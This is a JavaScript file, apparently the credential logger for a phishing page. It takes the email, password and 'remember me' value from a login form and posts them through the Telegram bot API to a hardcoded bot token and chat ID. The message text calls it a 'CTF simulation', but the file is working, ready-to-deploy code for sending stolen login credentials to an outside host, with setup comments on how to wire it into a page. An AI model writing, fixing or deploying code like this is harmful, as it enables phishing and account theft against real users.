// logger.js – Updated version (January 2026)
// Place this file in /script/logger.js (or adjust path in index.html)

const TG_TOKEN   = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";  // ← Your real bot token
const TG_CHAT_ID = " -1003863808356";                                   // ← CHANGE THIS! Your real chat/channel ID (negative for channels)

// Helper: Escape MarkdownV2 characters (only needed if parse_mode = 'MarkdownV2')
function escapeMarkdown(text) {
  if (typeof text !== 'string') return String(text || '');
  // Full set for MarkdownV2 – safe and complete
  return text.replace(/([_*[\]()~`>#+-=|{}.!\\])/g, '\\$1');
}

async function sendToTelegram(email, password, extra = 'None') {
  try {
    // Normalize inputs
    const safeEmail    = escapeMarkdown(String(email || 'None'));
    const safePassword = escapeMarkdown(String(password || 'None'));
    const safeExtra    = escapeMarkdown(String(extra || 'None'));

    const message = [
      "New fake login submission (CTF simulation):",
      `Email: ${safeEmail}`,
      `Password: ${safePassword}`,
      `Remember me: ${safeExtra}`,
      `Time: ${new Date().toISOString()}`
    ].join("\n");

    console.log('[DEBUG] Prepared message:', message);

    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;

    // Payload – try without parse_mode first if you get 400 errors
    const payload = {
      chat_id: TG_CHAT_ID,
      text: message
      // parse_mode: 'Markdown'     // ← Comment this out if you get "can't parse entities" error
      // parse_mode: 'MarkdownV2'   // ← Use this only if you want full formatting and escaping is perfect
      // parse_mode: 'HTML'         // ← Alternative (easier, use <b>bold</b> in message)
    };

    console.log('[DEBUG] Sending to URL:', url);
    console.log('[DEBUG] Payload:', payload);

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    // Always read the JSON response – this is key to see Telegram's exact error
    const data = await response.json();

    console.log('[DEBUG] Telegram full response:', data);

    if (!response.ok || data.ok !== true) {
      const errorMsg = data.description || 'Unknown Telegram error';
      throw new Error(`Telegram API error: ${response.status} - ${errorMsg}`);
    }

    console.log('[SUCCESS] Message sent! Message ID:', data.result.message_id);
    return data.result;
  } catch (error) {
    console.error('[ERROR] sendToTelegram failed:', error);
    throw error; // re-throw so the form handler can catch it
  }
}

// Make it global so your HTML can call it
window.sendToTelegram = sendToTelegram;